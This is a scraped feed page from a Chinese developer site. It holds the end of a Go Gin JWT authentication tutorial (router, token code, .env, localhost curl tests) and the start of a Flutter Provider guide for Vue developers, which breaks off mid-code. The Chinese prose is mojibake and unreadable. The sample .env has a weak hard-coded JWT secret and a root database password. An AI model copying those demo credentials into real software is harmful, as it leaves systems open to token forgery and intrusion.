        auth := api.Group(<span class="hljs-string">"/auth"</span>)
        auth.POST(<span class="hljs-string">"/login"</span>, controllers.Login)
        auth.POST(<span class="hljs-string">"/reg"</span>, controllers.Register)
        <span class="hljs-comment">// è·¯ç”±/api/v1/authå¼€å¤´çš„éƒ½åŠ ä¸Šè®¤è¯</span>
        auth.Use(middlewares.AuthMiddleware())
        {
            auth.GET(<span class="hljs-string">"/me"</span>, controllers.Me)
            <span class="hljs-comment">//å…¶ä»–è·¯ç”±</span>
        }
    })
}
</code></pre>
<h3 data-id="heading-8">2.7 utils/jwt.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> utils
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"os"</span>
    <span class="hljs-string">"time"</span>
    <span class="hljs-string">"github.com/golang-jwt/jwt/v5"</span>
)
<span class="hljs-keyword">type</span> Claims <span class="hljs-keyword">struct</span> {
    UserID <span class="hljs-type">uint</span> <span class="hljs-string">`json:"user_id"`</span>
    jwt.RegisteredClaims
}
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getSecret</span><span class="hljs-params">()</span></span> []<span class="hljs-type">byte</span> {
    s := os.Getenv(<span class="hljs-string">"JWT_SECRET"</span>)
    <span class="hljs-keyword">if</span> s == <span class="hljs-string">""</span> {
        <span class="hljs-built_in">panic</span>(<span class="hljs-string">"è¯·åœ¨.envæ–‡ä»¶é‡Œé…ç½®ã€JWT_SECRETã€‘"</span>)
    }
    <span class="hljs-keyword">return</span> []<span class="hljs-type">byte</span>(s)
}
<span class="hljs-comment">// ç”Ÿæˆtoken</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateToken</span><span class="hljs-params">(userID <span class="hljs-type">uint</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
    expireHours := <span class="hljs-number">24</span>
    <span class="hljs-keyword">if</span> v := os.Getenv(<span class="hljs-string">"JWT_EXPIRE_HOURS"</span>); v != <span class="hljs-string">""</span> {
        <span class="hljs-keyword">var</span> parsed <span class="hljs-type">int</span>
        <span class="hljs-keyword">if</span> _, err := fmt.Sscanf(v, <span class="hljs-string">"%d"</span>, &amp;parsed); err == <span class="hljs-literal">nil</span> {
            expireHours = parsed
        }
    }
    claims := &amp;Claims{
        UserID: userID,
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Duration(expireHours) * time.Hour)),
            IssuedAt:  jwt.NewNumericDate(time.Now()),
            Issuer:    <span class="hljs-string">"Codeeå›"</span>,
        },
    }
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    <span class="hljs-keyword">return</span> token.SignedString(getSecret())
}
<span class="hljs-comment">// è§£ætoken</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ParseToken</span><span class="hljs-params">(tokenStr <span class="hljs-type">string</span>)</span></span> (*Claims, <span class="hljs-type">error</span>) {
    token, err := jwt.ParseWithClaims(tokenStr, &amp;Claims{}, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(token *jwt.Token)</span></span> (<span class="hljs-keyword">interface</span>{}, <span class="hljs-type">error</span>) {
        <span class="hljs-comment">// ensure signing method is HMAC</span>
        <span class="hljs-keyword">if</span> _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"ç­¾åæ–¹æ³•ä¸æ”¯æŒ: %v"</span>, token.Header[<span class="hljs-string">"alg"</span>])
        }
        <span class="hljs-keyword">return</span> getSecret(), <span class="hljs-literal">nil</span>
    })
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    <span class="hljs-keyword">if</span> claims, ok := token.Claims.(*Claims); ok &amp;&amp; token.Valid {
        <span class="hljs-keyword">return</span> claims, <span class="hljs-literal">nil</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"tokenæ ¡éªŒå¤±è´¥"</span>)
}
</code></pre>
<h3 data-id="heading-9">2.8 .env</h3>
<pre><code class="hljs language-go" lang="go">PORT=<span class="hljs-number">8080</span>
JWT_SECRET=Codeeå›
JWT_EXPIRE_HOURS=<span class="hljs-number">24</span>
DATABASE_DSN=root:<span class="hljs-number">123456</span>@tcp(localhost:<span class="hljs-number">3306</span>)/golang_per_day?charset=utf8&amp;parseTime=True&amp;loc=Local&amp;timeout=<span class="hljs-number">1000</span>ms
</code></pre>
<h3 data-id="heading-10">2.9 go.mod</h3>
<pre><code class="hljs language-go" lang="go">module gindemo2
<span class="hljs-keyword">go</span> <span class="hljs-number">1.23</span><span class="hljs-number">.0</span>
toolchain go1<span class="hljs-number">.24</span><span class="hljs-number">.10</span>
require (
    github.com/gin-gonic/gin v1<span class="hljs-number">.11</span><span class="hljs-number">.0</span>
    github.com/golang-jwt/jwt/v5 v5<span class="hljs-number">.3</span><span class="hljs-number">.0</span>
    github.com/joho/godotenv v1<span class="hljs-number">.5</span><span class="hljs-number">.1</span>
    golang.org/x/crypto v0<span class="hljs-number">.40</span><span class="hljs-number">.0</span>
    gorm.io/driver/mysql v1<span class="hljs-number">.6</span><span class="hljs-number">.0</span>
    gorm.io/gorm v1<span class="hljs-number">.31</span><span class="hljs-number">.1</span>
)
...
</code></pre>
<h3 data-id="heading-11">2.10 main.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"log"</span>
    <span class="hljs-string">"os"</span>
    <span class="hljs-string">"github.com/joho/godotenv"</span>
    <span class="hljs-string">"gindemo2/config"</span>
    <span class="hljs-string">"gindemo2/models"</span>
    <span class="hljs-string">"gindemo2/routers"</span>
)
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// åŠ è½½envå˜é‡</span>
    <span class="hljs-keyword">if</span> err := godotenv.Load(); err != <span class="hljs-literal">nil</span> {
        log.Println(<span class="hljs-string">"No .env file found â€” using environment variables"</span>)
    }
    <span class="hljs-comment">// è¿æ¥æ•°æ®åº“</span>
    config.ConnectDatabase()
    <span class="hljs-comment">// è‡ªåŠ¨è¿ç§»</span>
    <span class="hljs-keyword">if</span> err := config.DB.AutoMigrate(&amp;models.User{}); err != <span class="hljs-literal">nil</span> {
        log.Fatalf(<span class="hljs-string">"AutoMigrate failed: %v"</span>, err)
    }
    <span class="hljs-comment">// åˆå§‹åŒ–è·¯ç”±</span>
    r := routers.InitRouter()
    port := os.Getenv(<span class="hljs-string">"PORT"</span>)
    <span class="hljs-keyword">if</span> port == <span class="hljs-string">""</span> {
        port = <span class="hljs-string">"8080"</span>
    }
    r.Run(<span class="hljs-string">":"</span> + port)
}
</code></pre>
<h2 data-id="heading-12">3ã€è¿è¡Œä¸æµ‹è¯•</h2>
<h3 data-id="heading-13">3.1 åˆå§‹åŒ–æ¨¡å—å¹¶ä¸‹è½½ä¾èµ–</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span>Â mod tidy
</code></pre>
<h3 data-id="heading-14">3.2 å¯åŠ¨æœåŠ¡</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span>Â run .
</code></pre>
<h3 data-id="heading-15">3.3 æ³¨å†Œç”¨æˆ·</h3>
<pre><code class="hljs language-go" lang="go">
$ curl -X POST http:<span class="hljs-comment">//localhost:8080/api/v1/auth/reg \                                                                          </span>
  -H <span class="hljs-string">"Content-Type: application/json"</span> \                                                                                         
  -d <span class="hljs-string">'{"username":"coding_jun","passwd":"golang"}'</span>                                                                              
{<span class="hljs-string">"message"</span>:<span class="hljs-string">"ç”¨ æˆ· åˆ› å»º æˆ åŠŸ "</span>,<span class="hljs-string">"user"</span>:{<span class="hljs-string">"id"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"coding_jun"</span>}}   
</code></pre>
<h3 data-id="heading-16">3.4 ç™»å½•</h3>
<pre><code class="hljs language-go" lang="go">$ curl -X POST http:<span class="hljs-comment">//localhost:8080/api/v1/auth/login \                                                                        </span>
  -H <span class="hljs-string">"Content-Type: application/json"</span> \                                                                                         
  -d <span class="hljs-string">'{"username":"coding_jun","passwd":"golang"}'</span>                                                                              
{<span class="hljs-string">"message"</span>:<span class="hljs-string">"ç™» å½• æˆ åŠŸ "</span>,<span class="hljs-string">"token"</span>:<span class="hljs-string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc3MiOiJDb2RlZeWQmyIsImV4cCI6MTc2MzM1MTcy
MywiaWF0IjoxNzYzMjY1MzIzfQ.GKNcht6PkqzO92tQuTSfy62AO8qSgZZB4AZCULfG12M"</span>,<span class="hljs-string">"user"</span>:{<span class="hljs-string">"id"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"coding_jun"</span>}} 
</code></pre>
<h3 data-id="heading-17">3.5 è®¿é—®å—ä¿æŠ¤çš„è·¯ç”±</h3>
<pre><code class="hljs language-go" lang="go">$ curl -H <span class="hljs-string">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc3MiOiJDb2RlZeWQmyIsImV4cCI6MTc2MzM1M 
TcyMywiaWF0IjoxNzYzMjY1MzIzfQ.GKNcht6PkqzO92tQuTSfy62AO8qSgZZB4AZCULfG12M"</span> http:<span class="hljs-comment">//localhost:8080/api/v1/auth/me                 </span>
{<span class="hljs-string">"message"</span>:<span class="hljs-string">"æŸ¥ è¯¢ æˆ åŠŸ "</span>,<span class="hljs-string">"user"</span>:{<span class="hljs-string">"id"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"coding_jun"</span>}} 
</code></pre>
<h2 data-id="heading-18">4ã€å®‰å…¨ä¸å»ºè®®ï¼ˆæ•²é»‘æ¿ï¼‰</h2>
<p><em>JWT_SECRETå¿…é¡»å¼ºå£®ä¸”ä¿å¯†ï¼Œä¸è¦æŠŠé»˜è®¤å¯†é’¥æ‰“åŒ…è¿›ä»£ç ï¼›ä½¿ç”¨HTTPSï¼›ç”Ÿæˆä¸­å»ºè®®ä½¿ç”¨Access Token+ Refresh Tokenæ¥é¿å…tokençš„é•¿æœŸæš´éœ²ï¼›ä¸¥æ ¼é”™è¯¯ä¿¡æ¯ï¼Œä¸è¦åœ¨è®¤è¯å¤±è´¥çš„æ—¶å€™è¿”å›è¿‡å¤šç»†èŠ‚ï¼Œä¾‹å¦‚â€œç”¨æˆ·ä¸å­˜åœ¨â€å°±åˆ«è¯´äº†ï¼›é˜²æ­¢æš´åŠ›ç ´è§£ï¼Œå¯¹ç™»å½•å°è¯•æ¬¡æ•°åšé™åˆ¶ï¼›åŠ å…¥tokené»‘åå•ï¼Œä¾‹å¦‚é€€å‡ºã€å¼ºåˆ¶ä¸‹çº¿ç­‰ã€‚</em></p>
<h2 data-id="heading-19">5ã€<em>æºç åœ°å€</em></h2>
<p>1ã€å…¬ä¼—å·â€œCodeeå›â€å›å¤â€œæºç â€è·å–æºç </p>
<p>2ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.baidu.com%2Fs%2F1B6pgLWfSgMngVeFfSTcPdg%3Fpwd%3Djc1s" target="_blank" title="https://pan.baidu.com/s/1B6pgLWfSgMngVeFfSTcPdg?pwd=jc1s" ref="nofollow noopener noreferrer">pan.baidu.com/s/1B6pgLWfSâ€¦</a></p>
<hr/>
<p>å¦‚æœæ‚¨å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·æ‚¨ï¼ˆç‚¹èµã€åˆ†äº«ã€äº®çˆ±å¿ƒï¼‰ï¼Œä¸‡åˆ†æ„Ÿè°¢ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[# Flutter Provider çŠ¶æ€ç®¡ç†ç²¾è®²ï¼ˆVue å¼€å‘è€…è§†è§’ï¼‰]]></title>    <link>https://juejin.cn/post/7594093947809185826</link>    <guid>https://juejin.cn/post/7594093947809185826</guid>    <pubDate>2026-01-12T10:59:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594093947809185826" data-draft-id="7594051966890082339" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="# Flutter Provider çŠ¶æ€ç®¡ç†ç²¾è®²ï¼ˆVue å¼€å‘è€…è§†è§’ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-12T10:59:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å–ç«ç®­çš„å°ç”·å­©"/> <meta itemprop="url" content="https://juejin.cn/user/4457847613830523"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            # Flutter Provider çŠ¶æ€ç®¡ç†ç²¾è®²ï¼ˆVue å¼€å‘è€…è§†è§’ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4457847613830523/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å–ç«ç®­çš„å°ç”·å­©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T10:59:03.000Z" title="Mon Jan 12 2026 10:59:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ“Œ çŸ¥è¯†ä½“ç³»æ€ç»´å¯¼å›¾</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/991a295ccac84c9eb3dfdb4ecb12970c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2W54Gr566t55qE5bCP55S35a2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768820343&amp;x-signature=Rx9xQVQSJNgRXyx%2FPv9nFL%2Fi1Uo%3D" alt="Flutter Provider æ ¸å¿ƒçŸ¥è¯†ä½“ç³».png" loading="lazy"/></p>
<h2 data-id="heading-1">ä¸€ã€Vue åˆ° Flutterï¼šæ€ç»´æ¨¡å¼è½¬æ¢</h2>
<h3 data-id="heading-2">1.1 æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”è¡¨</h3>













































<table><thead><tr><th>Vue æ¦‚å¿µ</th><th>Flutter Provider æ¦‚å¿µ</th><th>å…³é”®å·®å¼‚</th></tr></thead><tbody><tr><td><strong>Vuex Store</strong></td><td><code>ChangeNotifier</code> æ¨¡å‹ç±»</td><td>Vuex æ˜¯å•ä¾‹å…¨å±€å­˜å‚¨ï¼ŒProvider å¯ä»¥åˆ›å»ºå¤šä¸ªç‹¬ç«‹ä½œç”¨åŸŸ</td></tr><tr><td><strong>State</strong></td><td>æ¨¡å‹ç±»ä¸­çš„æ•°æ®å­—æ®µ</td><td>Flutter ä¸­çŠ¶æ€æ˜¯æ˜¾å¼çš„ç±»å±æ€§ï¼Œéœ€è¦æ‰‹åŠ¨é€šçŸ¥æ›´æ–°</td></tr><tr><td><strong>Mutations</strong></td><td>æ¨¡å‹ç±»ä¸­çš„æ–¹æ³• + <code>notifyListeners()</code></td><td>Flutter æ²¡æœ‰ä¸¥æ ¼çš„ mutations çº¦æŸï¼Œä»»ä½•æ–¹æ³•éƒ½å¯ä¿®æ”¹çŠ¶æ€</td></tr><tr><td><strong>Actions</strong></td><td>æ¨¡å‹ç±»ä¸­çš„å¼‚æ­¥æ–¹æ³•</td><td>æ¦‚å¿µç±»ä¼¼ï¼Œä½†ä¸éœ€è¦ç‰¹æ®Šå®šä¹‰</td></tr><tr><td><strong>Getters</strong></td><td>æ¨¡å‹ç±»ä¸­çš„ getter æ–¹æ³•</td><td>å®Œå…¨ç›¸åŒçš„å·¥ä½œåŸç†</td></tr><tr><td><strong>mapState</strong></td><td><code>Consumer</code> / <code>Selector</code></td><td>éƒ½æ˜¯è®¢é˜…çŠ¶æ€å˜åŒ–çš„æœºåˆ¶</td></tr><tr><td><strong>this.$store</strong></td><td><code>Provider.of(context)</code></td><td>Vue é€šè¿‡ this è®¿é—®ï¼ŒFlutter é€šè¿‡ BuildContext è®¿é—®</td></tr></tbody></table>
<h3 data-id="heading-3">1.2 å…³é”®æ¶æ„å·®å¼‚</h3>
<p><strong>Vue å“åº”å¼ç³»ç»Ÿ</strong>ï¼š</p>
<ul>
<li>è‡ªåŠ¨ä¾èµ–è¿½è¸ª</li>
<li>è™šæ‹Ÿ DOM diff æ›´æ–°</li>
<li>ç»„ä»¶å†…å¯ç›´æ¥ä¿®æ”¹çŠ¶æ€ï¼ˆéä¸¥æ ¼æ¨¡å¼ï¼‰</li>
</ul>
<p><strong>Flutter Provider ç³»ç»Ÿ</strong>ï¼š</p>
<ul>
<li>æ‰‹åŠ¨å£°æ˜ä¾èµ–å…³ç³»</li>
<li>Widget æ ‘é‡å»ºï¼ˆéè™šæ‹Ÿ DOMï¼‰</li>
<li><strong>ä¸å¯å˜ Widget æ ‘</strong>ï¼ˆæ ¸å¿ƒå·®å¼‚ï¼ï¼‰</li>
<li>å¿…é¡»é€šè¿‡ <code>notifyListeners()</code> æ˜¾å¼é€šçŸ¥</li>
</ul>
<h2 data-id="heading-4">äºŒã€Flutter Provider æ ¸å¿ƒæœºåˆ¶è¯¦è§£</h2>
<h3 data-id="heading-5">2.1 ä¸å¯å˜ Widget æ ‘ä¸é‡å»ºæœºåˆ¶</h3>
<p>è¿™æ˜¯ Vue å¼€å‘è€…æœ€éœ€è¦ç†è§£çš„ <strong>Flutter æ ¸å¿ƒç†å¿µ</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Flutter Widget æ˜¯ä¸å¯å˜çš„ï¼Œä¸èƒ½è¿™æ ·å†™</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-built_in">String</span> text = <span class="hljs-string">"åˆå§‹å€¼"</span>; <span class="hljs-comment">// è¿™ä¸ªå€¼æ”¹å˜åï¼ŒWidget ä¸ä¼šé‡å»º</span>
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Text(text);
  }
}

<span class="hljs-comment">// æ­£ç¡®åšæ³•ï¼šé€šè¿‡çŠ¶æ€ç®¡ç†é‡å»ºæ•´ä¸ª Widget</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// æ¯æ¬¡ build éƒ½ä» Provider è·å–æœ€æ–°å€¼</span>
    <span class="hljs-keyword">final</span> text = Provider.of&lt;MyModel&gt;(context).text;
    <span class="hljs-keyword">return</span> Text(text);
  }
}
</code></pre>
<p><strong>ç†è§£é‡ç‚¹</strong>ï¼š</p>
<ul>
<li>æ¯æ¬¡çŠ¶æ€å˜åŒ– â†’ <code>notifyListeners()</code> è¢«è°ƒç”¨</li>
<li>ä¾èµ–è¯¥çŠ¶æ€çš„ Widget çš„ <code>build()</code> æ–¹æ³•é‡æ–°æ‰§è¡Œ</li>
<li>Flutter æ¯”è¾ƒæ–°æ—§ Widget æ ‘å·®å¼‚ï¼Œåªæ›´æ–°å˜åŒ–çš„éƒ¨åˆ†</li>
</ul>
<h3 data-id="heading-6">2.2 BuildContextï¼šFlutter çš„"ä¾èµ–æ³¨å…¥å®¹å™¨"</h3>
<p>ç±»æ¯” Vue ä¸­çš„ <code>this</code>ï¼Œä½†åŠŸèƒ½æ›´å¼ºå¤§ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Vue æ–¹å¼ï¼šé€šè¿‡ this è®¿é—®å…¨å±€ store</span>
methods: {
  addItem() {
    <span class="hljs-keyword">this</span>.$store.commit(<span class="hljs-string">'ADD_ITEM'</span>, newItem)
  }
}

<span class="hljs-comment">// Flutter æ–¹å¼ï¼šé€šè¿‡ context è®¿é—® Provider</span>
<span class="hljs-keyword">void</span> addItem(BuildContext context) {
  <span class="hljs-comment">// listen: false è¡¨ç¤º"æˆ‘ä¸éœ€è¦ç›‘å¬å˜åŒ–ï¼Œåªæ˜¯è¯»å–/ä¿®æ”¹"</span>
  <span class="hljs-keyword">final</span> model = Provider.of&lt;ShoppingModel&gt;(context, listen: <span class="hljs-keyword">false</span>);
  model.addItem(newItem);
  <span class="hljs-comment">// æ³¨æ„ï¼šæ²¡æœ‰ç±»ä¼¼ Vuex çš„ commit çº¦æŸï¼Œç›´æ¥è°ƒç”¨æ–¹æ³•</span>
}
</code></pre>
<h2 data-id="heading-7">ä¸‰ã€å®Œæ•´å¼€å‘æµç¨‹ç¤ºä¾‹ï¼ˆè´­ç‰©æ¸…å•åº”ç”¨ï¼‰</h2>
<h3 data-id="heading-8">3.1 ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºæ•°æ®æ¨¡å‹ï¼ˆç±»æ¯” Vuex Moduleï¼‰</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/models/shopping_item.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingItem</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> id;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> name;
  <span class="hljs-built_in">int</span> quantity;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">double</span> price;
  <span class="hljs-built_in">bool</span> isCompleted;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> category;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">DateTime</span> createdAt;
  
  ShoppingItem({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.name,
    <span class="hljs-keyword">this</span>.quantity = <span class="hljs-number">1</span>,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.price,
    <span class="hljs-keyword">this</span>.isCompleted = <span class="hljs-keyword">false</span>,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.category,
  }) : id = <span class="hljs-built_in">DateTime</span>.now().millisecondsSinceEpoch.toString(),
       createdAt = <span class="hljs-built_in">DateTime</span>.now();
  
  <span class="hljs-comment">// ç±»ä¼¼ Vue ä¸­çš„è®¡ç®—å±æ€§</span>
  <span class="hljs-built_in">double</span> <span class="hljs-keyword">get</span> totalPrice =&gt; quantity * price;
  
  <span class="hljs-comment">// ç±»ä¼¼ Vue ä¸­çš„æ–¹æ³•ï¼Œç”¨äºåˆ›å»ºæ–°å®ä¾‹ï¼ˆä¸å¯å˜æ€§ï¼‰</span>
  ShoppingItem copyWith({
    <span class="hljs-built_in">String?</span> name,
    <span class="hljs-built_in">int?</span> quantity,
    <span class="hljs-built_in">double?</span> price,
    <span class="hljs-built_in">bool?</span> isCompleted,
    <span class="hljs-built_in">String?</span> category,
  }) {
    <span class="hljs-keyword">return</span> ShoppingItem(
      name: name ?? <span class="hljs-keyword">this</span>.name,
      quantity: quantity ?? <span class="hljs-keyword">this</span>.quantity,
      price: price ?? <span class="hljs-keyword">this</span>.price,
